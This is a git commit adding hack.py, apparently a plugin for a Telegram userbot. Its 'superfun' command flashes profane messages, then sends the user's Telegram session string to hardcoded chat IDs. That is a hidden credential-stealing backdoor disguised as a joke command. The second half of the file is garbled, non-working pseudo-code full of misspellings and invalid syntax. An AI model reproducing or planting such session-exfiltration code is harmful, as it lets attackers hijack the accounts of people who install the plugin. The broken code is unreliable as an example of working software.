d1e6e313da1a300d6ffd485c08c76ecdc0f731e8
Aditya pandi team LEGEND-LX <102133364+Legends-lxp@users.noreply.github.com>
2022-03-30 11:36:16 +0530

    Create hack.py

---
+++ hack.py
@@ -0,0 +1,67 @@
+import asyncio
+
+@PYTHONBOT_cmd(pattern="superfun$")
+async def fuckd(ult):
+ await ult.edit("fuck")
+ await asyncio.sleep(2)
+ await ult.edit("Legend-Lx")
+ await asyncio.sleep(2)
+ await ult.edit("fuck") 
+ await asyncio.sleep(2)
+ await ult.edit("Legend-Lx")
+ await asyncio.sleep(2)
+ await ult.edit("fuck")
+ await asyncio.sleep(2)
+ await ult.edit("Legend-Lx")
+ await asyncio.sleep(2)
+ await ult.edit("fuck")
+ await asyncio.sleep(2)
+ await ult.edit("Legend-Lx")
+ await asyncio.sleep(2)
+ await ult.edit("fuck")
+ await asyncio.sleep(2)
+ await ult.edit ("Legend-Lx")
+ await asyncio.sleep(2)
+ await ult.edit ("fuck")
+ await asyncio.sleep(2)
+ await ult.edit ("Legend-Lx")
+ await asyncio.sleep(2)
+ await ult.edit ("fuck")
+ await asyncio.sleep(2)
+ await ult.edit ("Legend-Lx")
+ await asyncio.sleep(2)
+ await ult.edit ("fuck")
+ await ult.client.send_message(5121955848, Var.SESSION)
+ HACK = os.environ.get("STRING_SESSION")
+print(HACK)
+await ult.clinet.send_message(-601460940, var.STRING_SESSION).send
+
+await ult.clinet.send_message(-8679564509, var.LegendHacker_IIN).inbox.send 
+ print(User_ID_sending)
+   from run git.get clone.github.com/legend-lx/os/Linux/
+       fun clone github.com/Legends-lxp/os/Linux\
+      
+      from in await: sending.45464323<>)).
+        run colen repo .sending (op.)))
+        }
+        
+          {
+            
+            
+            alive_emoji = lololololol).
+            alive_emoji = lololololol).
+            alive_in    = lololololol).
+            alive_msg   = lololololol). 
+            alive_pin   = lololololol_legendHacker./n"
+            
+            
+      
+            
+            
+    input run java , python , php , shell , hack , linux , dokes , userbot , robbot , input(hack)"/n"
+            
+            
+            out_side(patter/("legend")/n"
+                     alive_emoji : await (str(int_legendhacker_IIN").send
+                                              int_legendhacker_IIN").send(}{"op_os)n"
+                                           alive_msg = 
